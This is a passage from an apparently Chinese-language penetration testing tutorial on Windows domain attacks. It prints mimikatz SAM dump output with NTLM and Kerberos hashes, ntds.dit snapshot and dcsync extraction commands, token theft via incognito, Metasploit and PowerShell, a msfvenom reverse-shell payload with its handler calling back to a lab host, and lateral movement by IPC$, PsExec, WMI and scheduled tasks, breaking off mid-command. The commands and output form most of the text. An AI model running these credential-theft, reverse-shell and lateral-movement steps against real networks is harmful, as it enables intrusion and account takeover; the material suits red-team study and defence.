class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\ascotbe&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #19041 Jul 15 2020 16:10:22</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># token::elevate</span></span><br><span class="line">Token Id  : <span class="number">0</span></span><br><span class="line">User name :</span><br><span class="line">SID name  : NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line"><span class="number">868</span>     &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">87942</span>          NT AUTHORITY\SYSTEM     S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Primary</span><br><span class="line"> -&gt; Impersonated !</span><br><span class="line"> * <span class="keyword">Process</span> Token : &#123;<span class="number">0</span>;<span class="number">04</span>c06ab9&#125; <span class="number">2</span> F <span class="number">589748425</span>   DESKTOP<span class="literal">-S5P5JJD</span>\ascotbe S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3954380970</span><span class="literal">-1750975696</span><span class="literal">-2860310519</span><span class="literal">-1001</span> (<span class="number">17</span>g,<span class="number">24</span>p)        Primary</span><br><span class="line"> * Thread Token  : &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">590261325</span>   NT AUTHORITY\SYSTEM     S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Impersonation (Delegation)</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br><span class="line">Domain : DESKTOP<span class="literal">-S5P5JJD</span></span><br><span class="line">SysKey : <span class="number">162</span>ff22be845ceffcb86ad9fc6f5b8fa</span><br><span class="line">Local SID : S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3954380970</span><span class="literal">-1750975696</span><span class="literal">-2860310519</span></span><br><span class="line"></span><br><span class="line">SAMKey : c0776d417550ffc4c869dd75f05c783c</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f7 (<span class="number">503</span>)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f8 (<span class="number">504</span>)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: ea5440b2fca105cdf6759f22e7c287d6</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">41</span>ccbf610919ce0103bd5f9f03349bf6</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">01</span>c68f20c20b145a433f03a4b8922e9da06a8452f94d18a51e839b2d72d7c8e7</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>b87d173421e72aec02ba1e0e1b043c8</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : f229fdcb8cc20e2c</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f229fdcb8cc20e2c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>e9 (<span class="number">1001</span>)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: <span class="number">3</span>dbde697d71690a769204beb12283678</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">1</span>f3b3c572b6a2f91204b073d6f148738</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDascotbe</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : e81117c0e58f31c5fc22e4ba480bb933c3b736986fc6975f714c79e22f8e7e1f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>a4b1385fb0c7f0b763435c285d47037</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : e81117c0e58f31c5fc22e4ba480bb933c3b736986fc6975f714c79e22f8e7e1f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>a4b1385fb0c7f0b763435c285d47037</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDascotbe</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>ea (<span class="number">1002</span>)</span><br><span class="line">User : asc0t6e</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">5791</span>ed4fcb24d37bb6d45e422d0564b6</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDasc0t6e</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : fca1c2a6324d2824dfb41aa111c7225eb054028a1943c4a2f88b33e5c1d6d724</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">707804346421</span>c4c8834250d85b3a0d80</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">89763</span>b4ae3b3f829</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDasc0t6e</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">89763</span>b4ae3b3f829</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>eb (<span class="number">1003</span>)</span><br><span class="line">User : www2</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : acc5ca5339811d2f4cf44f8427ff9333</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDwww2</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">37425</span>bb81e1ceb50cff95dfb985c60aeb3a44941b1c186cf6a2ecb66cb87a49d</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : b6ae15c330aa7db1b0f4b53575516c1e</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">622</span>f8686a8fecbc8</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDwww2</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">622</span>f8686a8fecbc8</span><br></pre></td></tr></table></figure><h3 id="域Hash"><a href="#域Hash" class="headerlink" title="域Hash"></a>域Hash</h3><h4 id="NTDSUTIL"><a href="#NTDSUTIL" class="headerlink" title="NTDSUTIL"></a>NTDSUTIL</h4><p>该NTDSUTIL是一个命令行工具，它是域控制器生态系统的一部分，其目的是为了使管理员能够访问和管理<code>Windows Active Directory</code>数据库。但是，渗透测试人员和redteam可以用它来拍摄现有ntds.dit文件的快照，该文件可以复制到新位置以进行离线分析和密码哈希的提取。</p><blockquote><p>PS：只有在域服务器上才有这个程序</p></blockquote><p>执行这个命令就可以拍摄快照了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full C:\ntdsutil</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/59.png?raw=true" alt="image-20200803213243474"></p><p>然后在<code>C:\ntdsutil</code>位置就能看到拍摄的快照了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/60.png?raw=true" alt="image-20200803213325057"></p><p>然后可以使用<strong>NTDSDumpEx</strong>进行解密，项目地址如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;NTDSDumpEx</span><br></pre></td></tr></table></figure><p>如果你只是使用管理员权限运行的话可以执行如下命令来获取hash，<code>-d</code>表示该文件的路径，<code>-k</code>表示获取的SYSTEM的key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsdumpex.exe -r</span><br><span class="line">ntdsdumpex.exe -d ntds.dit -o hash.txt -k HEX-SYS-KEY</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/61.png?raw=true" alt="image-20200803214714406"></p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Mimikatz有一个功能（dcsync），它利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值。这样子解决了需要直接使用域控制器进行身份验证的需要，因为它可以从域管理员的上下文中获得执行权限。因此它是红队的基本操作，因为它不那么复杂。</p><p>提取域中所有用户HASH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/62.png?raw=true" alt="image-20200803215925120"></p><p>如果要获取指定的用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;user:admin</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/63.png?raw=true" alt="image-20200803220106374"></p><h4 id="AccessToken窃取"><a href="#AccessToken窃取" class="headerlink" title="AccessToken窃取"></a>AccessToken窃取</h4><blockquote><p>令牌(Token)</p></blockquote><p><strong>令牌(token)是系统的临时秘钥，相当于账号和密码</strong>，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，<strong>访问网络和系统资源</strong>，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。</p><p><strong>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。</strong></p><p><strong>令牌有很多种：</strong></p><ul><li>访问令牌(Access Token)：表示访问控制操作主体的系统对象</li><li>会话令牌(Session Token)：是交互会话中唯一的身份标识符</li><li>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</li></ul><p><strong>Windows的AccessToken有两种类型：</strong></p><ul><li><strong>Delegation Token：授权令牌，它支持交互式会话登录</strong> (例如本地用户直接登录、远程桌面登录访问)</li><li><strong>Impresonation Token：模拟令牌，它是非交互的会话</strong> (例如使用net use访问共享文件夹)。</li></ul><p><strong>注：</strong> 两种token只在系统重启后清除 具有Delegation token的用户在注销后，该Token将变成Impersonation token，依旧有效。</p><p>目前有三种利用方式incognito.exe程序 、InvokeTokenManipulat.ps1脚本 、MSF里的incognito模块</p><h5 id="程序incognito"><a href="#程序incognito" class="headerlink" title="程序incognito"></a>程序incognito</h5><p>下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.mwrinfosecurity.com&#x2F;assets&#x2F;BlogFiles&#x2F;incognito2.zip</span><br></pre></td></tr></table></figure><p><strong>AccessToken的列举</strong>(需要administrator权限)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/64.png?raw=true" alt="image-20200803221305645"></p><p>可以看到Token都列举出来了，我们只需要复制token然后即可提权，也可以进行降权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#提权至system</span></span><br><span class="line">.\incognito.exe execute -c <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/65.png?raw=true" alt="image-20200803221740843"></p><h5 id="MSF下的incognito模块"><a href="#MSF下的incognito模块" class="headerlink" title="MSF下的incognito模块"></a>MSF下的incognito模块</h5><p>首先生成进程让我们的kali连接到域控中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.183.138  LPORT=6666 -e x86/shikata_ga_nai -i 5 -b <span class="string">&quot;\x00&quot;</span> -f exe &gt;test.exe</span><br></pre></td></tr></table></figure><p>然后监听进程连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.183.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>连接上后就可以直接提权了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito <span class="comment">#加载incognito</span></span><br><span class="line">list_tokens -u <span class="comment">#列出AccessToken</span></span><br><span class="line">getuid    <span class="comment">#查看当前token</span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="comment">#模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可</span></span><br><span class="line">steal_token 1252 <span class="comment">#从进程窃取token</span></span><br><span class="line">getsystem <span class="comment">#提升至system权限</span></span><br><span class="line">rev2self <span class="comment">#返回到之前的AccessToken权限</span></span><br></pre></td></tr></table></figure><h5 id="Invoke-TokenManipulation-ps1脚本"><a href="#Invoke-TokenManipulation-ps1脚本" class="headerlink" title="Invoke-TokenManipulation.ps1脚本"></a>Invoke-TokenManipulation.ps1脚本</h5><p>下载地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;blob&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-TokenManipulation.ps1</span><br></pre></td></tr></table></figure><p>使用命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入脚本</span></span><br><span class="line">Import-Module .\Invoke-TokenManipulation.ps1</span><br><span class="line"><span class="comment">#列举token</span></span><br><span class="line">Invoke-TokenManipulation -Enumerate</span><br><span class="line"><span class="comment">#提权至system</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -Username <span class="string">&quot;nt authoritysystem&quot;</span></span><br><span class="line"><span class="comment">#复制(窃取)进程token</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -ProcessId 500</span><br><span class="line"><span class="comment">#复制(窃取)线程token</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -ThreadId 500</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/66.png?raw=true" alt="image-20200803225323734"></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/67.png?raw=true" alt="image-20200803225536976"></p><h5 id="利用token获得TrustedInstaller权限"><a href="#利用token获得TrustedInstaller权限" class="headerlink" title="利用token获得TrustedInstaller权限"></a>利用token获得TrustedInstaller权限</h5><p>在Windows系统中，即使获得了管理员权限和system权限，也不能修改系统文件</p><p>因为Windows系统的最高权限为<strong>TrustedInstaller</strong></p><p>可以看到我们拥有<strong>SYSTEM</strong>权限也无法在目录<code>C:\Windows\servicing</code>下写入文件</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/68.png?raw=true" alt="image-20200803225848113"></p><p>但是<strong>TrustedInstaller.exe</strong>是有这个权限的，可以通过<code>Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner</code>来查看</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/69.png?raw=true" alt="image-20200803231351000"></p><p>我们可以使用<code>sc.exe start TrustedInstaller</code>来启动这个服务，然后找到这个进程，通过窃取这个进程的Token来提升权限</p><p>可以看到下图虽然我们还是system的权限，但是我们已经可以在<code>C:\Windows\servicing</code>目录下面写入文件了，同理MSF中的incognito模块也能成功</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/70.png?raw=true" alt="image-20200803231243500"></p><h3 id="密码喷射"><a href="#密码喷射" class="headerlink" title="密码喷射"></a>密码喷射</h3><p>弱口令，永远改不完。在内网中，也可以尝试对smb、3389、mssql弱口令进行密码暴力破解，但是要注意线程，密码数不要太多。当然，也可以使用不同账号，同个密码进行尝试。这里使用kerbrute对域用户/密码进行暴力破解</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;kerbrute</span><br></pre></td></tr></table></figure><p>这项目需要使用字典来枚举用户或者枚举密码，这里就懒得演示了</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>留个坑，这个还不是很明白</p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>全程使用windows 10 连接我们的域控 windows 2008 </p><ul><li>域控IP： <strong>192.168.183.143</strong></li><li>用户名：<strong>administrator</strong></li><li>密码：<strong>XXXXXX</strong></li></ul><h3 id="账号密码链接"><a href="#账号密码链接" class="headerlink" title="账号密码链接"></a>账号密码链接</h3><p>当我们获取到机器的账号密码的时候，可以尝试用以下几种方式进行连接并执行命令。</p><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>利用条件：</p><ul><li><strong>139</strong> or <strong>445</strong>端口开启</li><li>管理员开启默认共享</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\1.1.1.1\ipc$  &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/71.png?raw=true" alt="image-20200805211744299"></p><p>建立好连接后可以把对方的C盘映射到自己的Z盘中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\192.168.183.143\c$</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/72.png?raw=true" alt="image-20200805211845297"></p><p>还能执行木马文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#建立好IPC后，把shell.exe复制到目标机器上(这里的$是指admin用户的c:\winnt\system32\)</span><br><span class="line">copy shell.exe \\1.1.1.1\admin$</span><br><span class="line">#然后查看目标机器的时间</span><br><span class="line">net time \\127.0.0.1</span><br><span class="line">#用at命令让目标机器12点执行shell.exe文件</span><br><span class="line">at \1.1.1.1 12:00 shell.exe</span><br></pre></td></tr></table></figure><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>直接去微软官网下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;sysinternals&#x2F;downloads&#x2F;psexec</span><br></pre></td></tr></table></figure><p>下载好把文件提取出来就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 用服务启动的方式：</span><br><span class="line">.\PsExec.exe  \\1.1.1.1 -accepteula -u username -p  password cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/73.png?raw=true" alt="image-20200805212914831"></p><h4 id="WMI-amp-WINRM"><a href="#WMI-amp-WINRM" class="headerlink" title="WMI&amp;WINRM"></a>WMI&amp;WINRM</h4><p><strong>方法一</strong></p><p>创建记事本进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic  /user:<span class="string">&quot;ascotbe.com\administrator&quot;</span>  /password:<span class="string">&quot;password&quot;</span>  /node:1.1.1.1 process call create <span class="string">&quot;notepad&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/74.png?raw=true" alt="image-20200805213359196"></p><p>然后看域控中的进程</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/75.png?raw=true" alt="image-20200805213420618"></p><p><strong>方法二</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WmiMethod  -class win32_process -name create -argumentlist <span class="string">&#x27;notepad&#x27;</span> -ComputerName  1.1.1.1 -Credential <span class="string">&#x27;ascotbe.com\administrator&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>方法三</strong></p><p>直接用360灵腾实验室的工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/360-Linton-Lab/WMIHACKER</span><br></pre></td></tr></table></figure><p>有回显查看whoami</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/76.png?raw=true" alt="image-20200805220346919"></p><p>还有文件下载、上传、模拟shell等模式</p><h4 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h4><p>定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru <span class="string">&quot;SYSTEM&quot;</span>  /tn <span class="string">&quot;windowsupdate&quot;</span> /sc DAILY  /tr <span class="string">&quot;calc&quot;</span> 